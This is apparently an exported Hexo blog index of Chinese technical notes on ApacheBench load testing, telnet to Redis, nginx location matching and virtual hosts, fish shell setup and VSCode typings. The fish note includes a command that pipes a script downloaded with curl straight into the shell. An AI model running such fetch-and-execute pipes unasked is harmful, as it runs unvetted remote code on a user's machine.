pip3 install --upgrade $TF_BINARY_URL</span><br></pre></td></tr></table></figure><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://github.com/tensorflow/tensorflow/blob/master/tensorflow/g3doc/get_started/os_setup.md">Download and Setup</a></p><hr><p><a href="https://ask.julyedu.com/question/7403">【1】</a></p><p><a href="http://wiki.jikexueyuan.com/project/neural-networks-and-deep-learning-zh-cn/">神经网络与深度学习</a></p><p><a href="https://www.gitbook.com/book/hit-scir/neural-networks-and-deep-learning-zh_cn/details">神经网络与深度学习</a></p><p><a href="https://ask.julyedu.com/question/7407">MAC chainer-fast-neuralstyle 实时风格转换</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python generate.py ./ritan.jpg -m ./models/starry.model -o ritan-starry.jpg</span><br></pre></td></tr></table></figure><p><a href="https://ask.julyedu.com/question/7403">梵高作画 MAC + tensorflow + CPU 版本</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python neural_style.py --content ./ritan.jpg --styles ./examples/1-style.jpg --output ./ritan-style.jpg --iterations 500</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ab</title>
      <link href="/post/ab.html"/>
      <url>/post/ab.html</url>
      
        <content type="html"><![CDATA[<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">yum install httpd-tools</span><br><span class="line">or</span><br><span class="line">yum install apr-util</span><br></pre></td></tr></table></figure><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><blockquote><p>并发数太大会有<code>Too many open files</code>错误。我们需要<code>ulimit -n 1024</code>设置打开最大文件句柄数即可。</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">ab -n 10000 -c 200 http://10.0.1.4/redis <span class="comment"># -n 后面的10000代表总共发出10000个请求；-c后面的200表示采用200个并发（模拟200个人同时访问），后面的网址表示测试的目标URL。</span></span></span><br><span class="line">This is ApacheBench, Version 2.3 &lt;$Revision: 1748469 $&gt;</span><br><span class="line">Copyright 1996 Adam Twiss, Zeus Technology Ltd, http://www.zeustech.net/</span><br><span class="line">Licensed to The Apache Software Foundation, http://www.apache.org/</span><br><span class="line"></span><br><span class="line">Benchmarking 10.0.1.4 (be patient)</span><br><span class="line">Completed 1000 requests</span><br><span class="line">Completed 2000 requests</span><br><span class="line">Completed 3000 requests</span><br><span class="line">Completed 4000 requests</span><br><span class="line">Completed 5000 requests</span><br><span class="line">Completed 6000 requests</span><br><span class="line">Completed 7000 requests</span><br><span class="line">Completed 8000 requests</span><br><span class="line">Completed 9000 requests</span><br><span class="line">Completed 10000 requests</span><br><span class="line">Finished 10000 requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Server Software:        nginx/1.11.3</span><br><span class="line">Server Hostname:        10.0.1.4</span><br><span class="line">Server Port:            80</span><br><span class="line"></span><br><span class="line">Document Path:          /redis # 测试的页面</span><br><span class="line">Document Length:        28 bytes # 页面大小</span><br><span class="line"></span><br><span class="line">Concurrency Level:      200 # 并发请求数</span><br><span class="line">Time taken for tests:   4.512 seconds # 整个测试持续的时间</span><br><span class="line">Complete requests:      10000 # 完成的请求数</span><br><span class="line">Failed requests:        170 # 失败的请求数</span><br><span class="line">   (Connect: 0, Receive: 0, Length: 170, Exceptions: 0)</span><br><span class="line">Total transferred:      1700170 bytes # 整个场景中的网络传输量</span><br><span class="line">HTML transferred:       280170 bytes # 整个场景中的HTML内容传输量</span><br><span class="line">Requests per second:    2216.07 [#/sec] (mean) # 吞吐率，大家最关心的指标之一，相当于 LR 中的每秒事务数，后面括号中的 mean 表示这是一个平均值</span><br><span class="line">Time per request:       90.250 [ms] (mean) # 用户平均请求等待时间，大家最关心的指标之二，相当于 LR 中的平均事务响应时间，后面括号中的 mean 表示这是一个平均值</span><br><span class="line">Time per request:       0.451 [ms] (mean, across all concurrent requests) # 服务器平均请求处理时间，大家最关心的指标之三</span><br><span class="line">Transfer rate:          367.94 [Kbytes/sec] received # 平均每秒网络上的流量，可以帮助排除是否存在网络流量过大导致响应时间延长的问题</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">这段表示网络上消耗的时间的分解</span></span><br><span class="line">Connection Times (ms)</span><br><span class="line">              min  mean[+/-sd] median   max</span><br><span class="line">Connect:        2   23   7.9     24     157</span><br><span class="line">Processing:    14   66  22.4     70     243</span><br><span class="line">Waiting:       14   66  22.4     70     243</span><br><span class="line">Total:         20   89  23.4     95     255</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">这段是每个请求处理时间的分布情况，50%的处理时间在95ms内，66%的处理时间在98ms内...，重要的是看90%的处理时间。</span></span><br><span class="line">Percentage of the requests served within a certain time (ms)</span><br><span class="line"><span class="meta prompt_">  50% </span><span class="language-bash">    95</span></span><br><span class="line"><span class="meta prompt_">  66% </span><span class="language-bash">    98</span></span><br><span class="line"><span class="meta prompt_">  75% </span><span class="language-bash">    99</span></span><br><span class="line"><span class="meta prompt_">  80% </span><span class="language-bash">   100</span></span><br><span class="line"><span class="meta prompt_">  90% </span><span class="language-bash">   102</span></span><br><span class="line"><span class="meta prompt_">  95% </span><span class="language-bash">   106</span></span><br><span class="line"><span class="meta prompt_">  98% </span><span class="language-bash">   110</span></span><br><span class="line"><span class="meta prompt_">  99% </span><span class="language-bash">   224</span></span><br><span class="line"><span class="meta prompt_"> 100% </span><span class="language-bash">   255 (longest request)</span></span><br><span class="line"><span class="meta prompt_">&gt;</span></span><br></pre></td></tr></table></figure><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="http://www.jianshu.com/p/43d04d8baaf7">超实用压力测试工具－ab工具</a></li><li><a href="http://www.ha97.com/4617.html">Web性能压力测试工具之ApacheBench（ab）详解</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> ab </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>telnet</title>
      <link href="/post/telnet.html"/>
      <url>/post/telnet.html</url>
      
        <content type="html"><![CDATA[<h3 id="telnet-连接-redis"><a href="#telnet-连接-redis" class="headerlink" title="telnet 连接 redis"></a>telnet 连接 redis</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">telnet 10.0.1.3 6379</span></span><br><span class="line">Trying 10.0.1.3...</span><br><span class="line">Connected to 10.0.1.3.</span><br><span class="line">Escape character is &#x27;^]&#x27;.</span><br><span class="line">set name tyk</span><br><span class="line">+OK</span><br><span class="line">get name</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">3</span></span><br><span class="line">tyk</span><br><span class="line">set age 10</span><br><span class="line">+OK</span><br><span class="line">get age</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">2</span></span><br><span class="line">10</span><br><span class="line">quit</span><br><span class="line">+OK</span><br><span class="line">Connection closed by foreign host.</span><br><span class="line"><span class="meta prompt_">&gt;</span></span><br></pre></td></tr></table></figure><h3 id="退出-telnet"><a href="#退出-telnet" class="headerlink" title="退出 telnet"></a>退出 telnet</h3><p><code>ctrl + ]</code> 然后 <code>quit</code></p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="http://www.cnblogs.com/peida/archive/2013/03/13/2956992.html">【1】</a> <a href="http://www.cnblogs.com/kuailewangzi1212/archive/2006/11/29/576986.html">【2】</a> <a href="http://wangyifeng.blog.51cto.com/2144905/398950">【3】</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>command</title>
      <link href="/post/command.html"/>
      <url>/post/command.html</url>
      
        <content type="html"><![CDATA[<ul><li><code>cd -</code> 返回前一个目录(<code>cd $OLDPWD</code>)</li><li><code>open .</code> 打开当前目录</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nginx-location</title>
      <link href="/post/nginx-location.html"/>
      <url>/post/nginx-location.html</url>
      
        <content type="html"><![CDATA[<h3 id="location-表达式类型"><a href="#location-表达式类型" class="headerlink" title="location 表达式类型"></a>location 表达式类型</h3><table><thead><tr><th>syntax</th><th>说明</th></tr></thead><tbody><tr><td>&#x3D;</td><td>进行普通字符精确匹配。也就是完全匹配。</td></tr><tr><td>^~</td><td>表示普通字符匹配（表示 uri 以某个常规字符串开头）。使用前缀匹配，如果匹配成功则不再匹配其他 location。</td></tr><tr><td>~</td><td>表示执行一个正则匹配，区分大小写</td></tr><tr><td>~*</td><td>表示执行一个正则匹配，不区分大小写</td></tr><tr><td></td><td>无任何前缀的都属于普通location</td></tr><tr><td>@</td><td>“@” 定义一个命名的 location，使用在内部定向时，例如 error_page, try_files</td></tr></tbody></table><h3 id="location-优先级说明"><a href="#location-优先级说明" class="headerlink" title="location 优先级说明"></a>location 优先级说明</h3><p>在nginx的location和配置中location的顺序没有太大关系。正location表达式的类型有关。相同类型的表达式，字符串长的会优先匹配。<br>以下是按优先级排列说明：<br>第一优先级：等号类型（&#x3D;）的优先级最高。一旦匹配成功，则不再查找其他匹配项。<br>第二优先级：^~类型表达式。一旦匹配成功，则不再查找其他匹配项。<br>第三优先级：正则表达式类型（~ ~* ）的优先级次之。如果有多个location的正则能匹配的话，则使用正则表达式最长的那个。<br>第四优先级：常规字符串匹配类型。按前缀匹配。</p><blockquote><p>普通匹配，遵循最长匹配规则，假设一个请求匹配到了两个普通规则，则选择匹配长度大的那个</p></blockquote><h3 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"># RULE_1 精确匹配</span><br><span class="line">location = / &#123;</span><br><span class="line">    echo &quot;600&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># RULE_2 精确匹配</span><br><span class="line">location = /images/favicon.ico &#123;</span><br><span class="line">    echo &quot;601&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># RULE_4 无前缀匹配 不能和`^~ /images/`一起配置，冲突。</span><br><span class="line"># location /images/ &#123;</span><br><span class="line">#   echo &quot;602;    &quot; </span><br><span class="line"># &#125;</span><br><span class="line"></span><br><span class="line"># RULE_5 普通字符匹配 字符匹配优先级大于正则</span><br><span class="line">location ^~ /images/ &#123;</span><br><span class="line">    echo &quot;602&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># RULE_6 普通字符匹配</span><br><span class="line">location ^~ /images/fruit/ &#123;</span><br><span class="line">    echo &quot;603&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># RULE_7 正则匹配</span><br><span class="line">location ~ ^/images/ &#123;</span><br><span class="line">    echo &quot;604&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># RULE_8 正则匹配</span><br><span class="line">location ~ \.(jpg|png|ico)$ &#123;</span><br><span class="line">    echo &quot;605&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># RULE_9 正则匹配</span><br><span class="line">location ~ /^documents/ &#123;   </span><br><span class="line">    echo &quot;606&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># RULE_10 正则匹配 **正则匹配时和顺序有关**</span><br><span class="line">location ~ \.(docx|pptx|pdf)$ &#123;</span><br><span class="line">    echo &quot;607&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># RULE_11 无前缀</span><br><span class="line">location /files/ &#123;</span><br><span class="line">    echo &quot;608&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># RULE_12 无前缀</span><br><span class="line">location /files/videos/ &#123;</span><br><span class="line">    echo &quot;609&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># 无前缀 RULE_13</span><br><span class="line">location / &#123;</span><br><span class="line">    echo &quot;699&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>/</code> &#x3D;&gt; 600;<br><code>/images/favicon.ico</code> &#x3D;&gt; 601;<br><code>/images/head.jpg</code> &#x3D;&gt; 602;<br><code>/images/person/ming.jpg</code> &#x3D;&gt; 602;<br><code>/images/fruit/watermelon.jpg</code> &#x3D;&gt; 603;<br><code>/head.png</code> &#x3D;&gt; 605;<br><code>/documents/project.docx</code> &#x3D;&gt; 606;<br><code>files/The-Lord-of-the-Rings.mp4</code> &#x3D;&gt; 608;<br><code>files/videos/The-Lord-of-the-Rings.mp4</code> &#x3D;&gt; 609;<br><code>/fruit.html</code> &#x3D;&gt; 699;    </p><h3 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h3><ol><li>精确匹配<code>=</code>优先级最大。</li><li>普通字符匹配<code>^~</code>比正则优先级大<code>~</code>，多个普通字符串规则都匹配时，匹配最长的优先级最高。</li><li>正则匹配时，如果多条规则都符合排在前面的的优先级最大。</li><li>无前缀最后匹配优先级最低，多个都匹配时，匹配最长的优先级最高。</li></ol><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="http://www.bo56.com/nginx-location%E5%9C%A8%E9%85%8D%E7%BD%AE%E4%B8%AD%E7%9A%84%E4%BC%98%E5%85%88%E7%BA%A7/">nginx location在配置中的优先级</a> </li><li><a href="https://gist.github.com/luxixing/7262911">ginx-location</a></li><li><a href="http://eyesmore.iteye.com/blog/1141660">Nginx 关于 location 的匹配规则详解</a></li><li><a href="http://denglz.blog.51cto.com/3617037/1341841">NGINX 的 location 语法规则</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> nginx </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nginx限流</title>
      <link href="/post/nginx-http-limit.html"/>
      <url>/post/nginx-http-limit.html</url>
      
        <content type="html"><![CDATA[<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="http://www.bo56.com/%E4%BD%BF%E7%94%A8%E9%99%90%E6%B5%81%E7%AD%96%E7%95%A5%EF%BC%8C%E8%AE%A9%E7%B3%BB%E7%BB%9F%E6%9B%B4%E7%A8%B3%E5%AE%9A/">【1】</a> <a href="http://jinnianshilongnian.iteye.com/blog/2305117">【2】</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> nginx </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nginx虚拟主机</title>
      <link href="/post/nginx-virtual-host.html"/>
      <url>/post/nginx-virtual-host.html</url>
      
        <content type="html"><![CDATA[<h3 id="基于名字的虚拟主机"><a href="#基于名字的虚拟主机" class="headerlink" title="基于名字的虚拟主机"></a>基于名字的虚拟主机</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen      80;</span><br><span class="line">    server_name example.org www.example.org;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">    listen      80;</span><br><span class="line">    server_name example.net www.example.net;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">    listen      80;</span><br><span class="line">    server_name example.com www.example.com;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这个配置中，<code>Nginx</code>仅仅检查请求的<code>Host</code>头以决定该请求应由哪个虚拟主机来处理。如果<code>Host</code>头没有匹配任意一个虚拟主机，或者请求中根本没有包含<code>Host</code>头，那<code>Nginx</code>会将请求分发到定义在此端口上的默认虚拟主机。在以上配置中，<strong>第一个</strong> 被列出的虚拟主机即<code>Nginx</code>的默认虚拟主机——这是<code>Nginx</code>的默认行为。而且，可以显式地设置某个主机为默认虚拟主机，即在<code>listen</code>指令中设置<code>default_server</code>参数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen      80 default_server;</span><br><span class="line">    server_name example.net www.example.net;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p><code>default_server</code> 参数从0.8.21版开始可用。在之前的版本中，应该使用”default”参数代替。<br><code>.example.com</code> 会匹配<code>example.com</code>和<code>www.example.com</code>。</p></blockquote><blockquote><p>Nginx是根据<code>Host</code>来查找虚拟主机的。下面例子我们使用IP发起的请求，但是在请求头中<code>Host</code>加上了域名<code>Nginx</code>就会去查找<code>www.example.com</code>这个主机。</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl --header &quot;Host: www.example.com&quot; http://127.0.0.1/</span><br></pre></td></tr></table></figure><h3 id="如何防止处理未定义主机名的请求"><a href="#如何防止处理未定义主机名的请求" class="headerlink" title="如何防止处理未定义主机名的请求"></a>如何防止处理未定义主机名的请求</h3><p>如果不允许请求中缺少<code>Host</code>头，可以定义如下主机，丢弃这些请求：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen       80;</span><br><span class="line">    server_name  &quot;&quot;;</span><br><span class="line">    return       444;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这里，我们设置主机名为空字符串以匹配未定义“Host”头的请求，而且返回了一个nginx特有的，非http标准的返回码444，它可以用来关闭连接。</p><blockquote><p>从0.8.48版本开始，这已成为主机名的默认设置，所以可以省略<code>server_name &quot;&quot;</code>。而之前的版本使用机器的<code>hostname</code>作为主机名的默认值。</p></blockquote><h3 id="基于域名和IP混合的虚拟主机"><a href="#基于域名和IP混合的虚拟主机" class="headerlink" title="基于域名和IP混合的虚拟主机"></a>基于域名和IP混合的虚拟主机</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen      192.168.1.1:80;</span><br><span class="line">    server_name example.org www.example.org;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">    listen      192.168.1.1:80;</span><br><span class="line">    server_name example.net www.example.net;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">    listen      192.168.1.2:80;</span><br><span class="line">    server_name example.com www.example.com;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个配置中，nginx 首先测试请求的 IP 地址和端口是否匹配某个 server 配置块中的 listen 指令配置。接着 nginx 继续测试请求的 Host 头是否匹配这个 server 块中的某个 server_name 的值。如果主机名没有找到，nginx 将把这个请求交给默认虚拟主机处理。例如，一个从 192.168.1.1:80 端口收到的访问 <a href="http://www.example.com/">www.example.com</a> 的请求将被监听 192.168.1.1:80 端口的默认虚拟主机处理，本例中就是第一个服务器，因为这个端口上没有定义名为 <a href="http://www.example.com/">www.example.com</a> 的虚拟主机。  </p><blockquote><p>首先匹配listen然后匹配server，如果没有全匹配的，那就用第一个匹配上listen的。</p></blockquote><p>默认服务器是监听端口的属性，所以不同的监听端口可以设置不同的默认服务器：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen      192.168.1.1:80;</span><br><span class="line">    server_name example.org www.example.org;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">    listen      192.168.1.1:80 default_server;</span><br><span class="line">    server_name example.net www.example.net;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">    listen      192.168.1.2:80 default_server;</span><br><span class="line">    server_name example.com www.example.com;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="http://tengine.taobao.org/nginx_docs/cn/docs/http/request_processing.html">Nginx如何处理一个请求</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> nginx </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>fish-shell</title>
      <link href="/post/fish-shell.html"/>
      <url>/post/fish-shell.html</url>
      
        <content type="html"><![CDATA[<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">brew install fish</span><br><span class="line"></span><br><span class="line">curl -L http://get.oh-my.fish | fish</span><br></pre></td></tr></table></figure><h3 id="切换脚本"><a href="#切换脚本" class="headerlink" title="切换脚本"></a>切换脚本</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chsh -s /usr/local/bin/fish</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">sudo</span> -u [user] chsh -s /usr/local/bin/fish</span></span><br></pre></td></tr></table></figure><blockquote><p>如果不生效，重新打开Terminal</p></blockquote><h3 id="安装主题"><a href="#安装主题" class="headerlink" title="安装主题"></a>安装主题</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">omf install [&lt;name&gt;|&lt;url&gt;]</span><br></pre></td></tr></table></figure><p><a href="https://github.com/oh-my-fish/oh-my-fish/blob/master/docs/Themes.md">主题列表</a></p><h3 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim ~/.config/fish/config.fish</span><br></pre></td></tr></table></figure><h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://github.com/oh-my-fish/oh-my-fish">【1】</a> <a href="http://doabit.com/posts/3-from-oh-my-zsh-to-oh-my-fish">【2】</a><a href="http://www.jianshu.com/p/7ffd9d1af788">【3】</a> <a href="https://github.com/oh-my-fish/oh-my-fish/blob/master/docs/zh-CN/FAQ.md">【4】</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> fish </tag>
            
            <tag> shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VSCode智能提示</title>
      <link href="/post/vscode-intellisense.html"/>
      <url>/post/vscode-intellisense.html</url>
      
        <content type="html"><![CDATA[<h3 id="安装Typings"><a href="#安装Typings" class="headerlink" title="安装Typings"></a>安装Typings</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g typings</span><br></pre></td></tr></table></figure><h3 id="安装相关提示信息文件"><a href="#安装相关提示信息文件" class="headerlink" title="安装相关提示信息文件"></a>安装相关提示信息文件</h3><h4 id="搜索"><a href="#搜索" class="headerlink" title="搜索"></a>搜索</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">typings search node</span><br></pre></td></tr></table></figure><p><img src="/images/WechatIMG40.jpeg"></p><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><blockquote><p>在提示文件列中<code>SOURCE</code>列，有的显示是<code>dt</code>有的是<code>npm</code>如果是<code>dt</code>，安装时应该在名字前加<code>dt~</code>。&#96;</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">typings install dt~node --global --save</span><br><span class="line">typings install lodash --save</span><br></pre></td></tr></table></figure><h4 id="什么时候需要使用-–global-参数"><a href="#什么时候需要使用-–global-参数" class="headerlink" title="什么时候需要使用 –global 参数"></a>什么时候需要使用 –global 参数</h4><ul><li>如果安装的包使用 script 标记来引用(如 jQuery )(也就是在浏览器中使用)</li><li>这个包是属于环境的一部分(如 node )时</li><li>该包没有使用 –global 安装失败时</li><li>如果报错了说需要加 global 时加–global</li></ul><h3 id="启用智能提示功能"><a href="#启用智能提示功能" class="headerlink" title="启用智能提示功能"></a>启用智能提示功能</h3><ul><li>第一种是在需要进行只能提示的文件最上行增加提示信息文件所在目录，格式如下:</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/// &lt;reference path=&quot;./typings/index.d.ts&quot; /&gt;</span><br></pre></td></tr></table></figure><blockquote><p>path为相对路径</p></blockquote><ul><li>第二种是在项目所在目录(在这里是NodeSnippet文件夹中)增加一个名为jsconfig.json的空文件。<blockquote><p><code>jsconfig.json</code>方式需要重启VSCode</p></blockquote></li></ul><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="http://www.cnblogs.com/IPrograming/p/VsCodeTypings.html">【1】</a></p>]]></content>
      
      
      
    </entry>
    
